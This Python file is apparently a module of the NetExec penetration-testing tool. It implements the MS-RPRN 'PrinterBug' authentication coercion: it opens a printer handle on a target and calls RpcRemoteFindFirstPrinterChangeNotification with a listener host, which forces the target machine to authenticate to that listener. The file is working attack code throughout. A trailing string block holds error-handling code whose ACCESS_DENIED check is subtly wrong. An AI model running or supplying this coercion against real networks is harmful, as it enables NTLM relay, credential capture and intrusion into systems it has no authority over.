from impacket.dcerpc.v5.ndr import NDRCALL
from impacket.dcerpc.v5.rprn import PRINTER_HANDLE, PRINTER_CHANGE_ADD_JOB, hRpcOpenPrinter
from impacket.dcerpc.v5.dtypes import LPWSTR, DWORD, LPBYTE, NULL

from nxc.modules.coerce_plus_method.DCERPCSessionError import DCERPCSessionError


class RpcRemoteFindFirstPrinterChangeNotification(NDRCALL):
    opnum = 62
    structure = (
        ("hPrinter", PRINTER_HANDLE),
        ("fdwFlags", DWORD),
        ("fdwOptions", DWORD),
        ("pszLocalMachine", LPWSTR),
        ("dwPrinterLocal", DWORD),
        ("cbBuffer", DWORD),
        ("pBuffer", LPBYTE),
    )


class RpcRemoteFindFirstPrinterChangeNotificationResponse(NDRCALL):
    structure = ()


def request(dce, listener, target):
    resp = hRpcOpenPrinter(dce, f"\\\\{target}\x00")

    # https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d
    request = RpcRemoteFindFirstPrinterChangeNotification()
    request["hPrinter"] = resp["pHandle"]
    request["fdwFlags"] = PRINTER_CHANGE_ADD_JOB
    request["pszLocalMachine"] = f"\\\\{listener}\x00"
    request["fdwOptions"] = 0x00000000
    request["dwPrinterLocal"] = 0
    request["cbBuffer"] = NULL
    request["pBuffer"] = NULL
    dce.request(request)

"""

try:
    resp = rprn.hRpcOpenPrinter(dce, f"\\\\{target}\x00")
except Exception as e:
    if str(e).find("Broken pipe") >= 0:
        # The connection timed-out. Let's try to bring it back next round
        self.context.log.debug("Connection failed - skipping host!")
        return None
    elif str(e).upper().find("ACCESS_DENIED"):
        # We're not admin, bye
        self.context.log.debug("Access denied - RPC call was denied")
        return None
"""